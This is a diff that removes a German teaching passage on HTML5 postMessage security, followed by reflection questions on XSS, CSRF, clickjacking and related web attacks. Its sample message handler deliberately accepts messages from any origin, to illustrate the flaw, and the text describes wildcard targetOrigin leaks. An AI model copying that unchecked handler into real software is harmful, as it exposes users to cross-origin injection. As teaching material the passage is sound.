-<p>Eine Webapplikation wird innerhalb eines Browser-Tabs geöffnet, ihre
-Einflussmöglichkeiten (z.B. mittels Javascript) beschränken sich auf
-Inhalte innerhalb des Browser-Tabs. Es gibt Use-Cases, bei denen eine
-Applikation mit einer Webseite innerhalb eines anderen Browser-Tabs bzw.
-Browser-Fensters interagieren will. Ein Beispiel sind web-basierte
-Präsentationsframeworks. Hier gibt es meistens zwei Browserfenster:
-eines für die aktuell dargestellte Präsentationsfolie und ein Fenster
-mit Notzien für den Vortragenden. Wird die Folie gewechselt sollten im
-zweiten Fenster ebenso die Kommentare für die aktuell angezeigte Folie
-dargestellt werden.</p>
-<p>Eine moderne Implementierungsmöglichkeit für diese Funktion ist <em>HTML5
-postMessage</em>. Die Webseite, welche eine Aktion ausführen will, kann eine
-Nachricht via Javascript absenden. Diese Nachricht beinhaltet die
-message, einen <em>Target-Origin</em> (kann auch das Wildcard <em>*</em> sein) und
-eine Liste von serialisierten Objekten (deren Owernship an den Empfänger
-übergehen). Die empfangende Webseite kann einen Callback-Handler für
-empfangene Webseiten registrieren und auf diese Weise auf die Nachricht
-reagieren.</p>
-<p>Ein Beispiel für einen Message-Handler:</p>
-<div class="highlight"><pre><span></span><code>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">messageHandler</span><span class="p">(</span><span class="nx">event</span><span class="p">){</span>
-<span class="w">        </span><span class="kr">from</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;From: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Data: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">alert</span><span class="p">(</span><span class="kr">from</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">alert</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">    </span><span class="c1">// Register the handler</span>
-<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;message&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">messageHandler</span><span class="p">)</span>
-<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</code></pre></div>
-<p>Das Beispiel zeigt bereits eine Schwachstelle von HTML5 postMessage: der
-<em>origin</em> wird nicht durch den Empfänger überprüft, sondern durch den
-Code des Empfängers.</p>
-<p>Wie kann eine Nachricht gesendet werden?</p>
-<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nx">otherWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span><span class="w"> </span><span class="nx">targetOrigin</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">transfer</span><span class="p">])</span>
-</code></pre></div>
-<p>Die jeweiligen Variablen wären:</p>
-<ul>
-<li>
-<p><strong>otherWindow</strong> gibt den Empfänger an. Dieser kann z.B. <em>parent</em>,
-    ein Iframe, <em>window.opener</em> oder<em>window.source</em> sein.</p>
-</li>
-<li>
-<p><strong>message</strong> ist der String der als Nachricht an den Empfänger
-    übertragen wird.</p>
-</li>
-<li>
-<p><strong>targetOrigin</strong> gibt die origin des Empfängers an, kann aber auch
-    als Wildcard (<em>*</em>) ausgeführt sein.</p>
-</li>
-<li>
-<p><strong>tranfer</strong> ist eine Liste von übertragenen Objekten. Diese können
-    vom Sender nicht mehr verwendet werden und gehen in den Besitz des
-    Empfängers über.</p>
-</li>
-</ul>
-<p>Hier ergeben sich zwei Angriffsszenarien:</p>
-<ol>
-<li>
-<p>Eine Webseite akzeptiert Nachrichten von beliebigen Quellen. Dies
-    könnte z.B. im Zuge eines XSS-Angriffs ausgenutzt werden.</p>
-</li>
-<li>
-<p>Beim Senden der Nachricht werden sensible Daten versendet ohne dass
-    der Empfänger eingeschränkt wird. Dies geht zumeist mit einer
-    <em>TargetOrigin</em> von <em>*</em> herein.</p>
-</li>
-</ol>
-<h2 id="reflektionsfragen">Reflektionsfragen</h2>
-<ol>
-<li>
-<p>Erkläre Reflected-, Stored- und DOM-Based XSS Angriffe. Welche
-    Gegenmaßnahmen gibt es und erläutere diese.</p>
-</li>
-<li>
-<p>Was sind unvalidated Forwards und Redirects? Wie kann dagegen
-    geschützt werden?</p>
-</li>
-<li>
-<p>Was sind Reverse Tab Nabbing Angriffe? Welche Absicherungsmaßnahmen
-    gibt es dagegen?</p>
-</li>
-<li>
-<p>Welche Sicherheitsprobleme können bei HTML5 Local Storage auftreten?</p>
-</li>
-<li>
-<p>Wie funktionieren Clickjacking-Angriffe und wie können diese
-    verhindert werden?</p>
-</li>
-<li>
-<p>Wie funktioniert ein CSRF-Angriff? Erläutere zwei potentielle
-    Gegenmaßnahmen?</p>
-</li>
-</ol>
-<p>[1] Das Document-Object-Model beschreibt eine Programmierschnittstelle
-welche HTML/XML-Daten als Baumstruktur darstellt. Mittels Javascript
-kann das DOM modifiziert werden um beispielsweise Elemente bzw. deren
-Attribute hinzuzufügen, entfernen oder zu modifizieren; Eventhandler zu
-setzen bzw. Events zu feuern; bzw. um CSS zu verändern.</p>
-<p>[6] Dies wird als UXSS bezeichnet, siehe auch
-<a href="https://blog.innerht.ml/the-misunderstood-x-xss-protection/">https://blog.innerht.ml/the-misunderstood-x-xss-protection/</a>.</p>
 
 
 
